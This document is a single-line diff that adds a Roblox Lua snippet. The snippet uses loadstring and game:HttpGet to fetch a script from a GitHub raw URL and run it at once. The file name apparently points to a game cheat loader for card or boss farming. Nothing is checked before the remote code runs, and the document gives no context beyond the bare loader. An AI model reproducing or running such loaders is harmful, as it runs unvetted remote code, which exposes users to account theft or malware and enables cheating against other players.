@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/f2p-boss-cards-ryujin-spam7-oiyr23pvmcy4c9.lua"))()
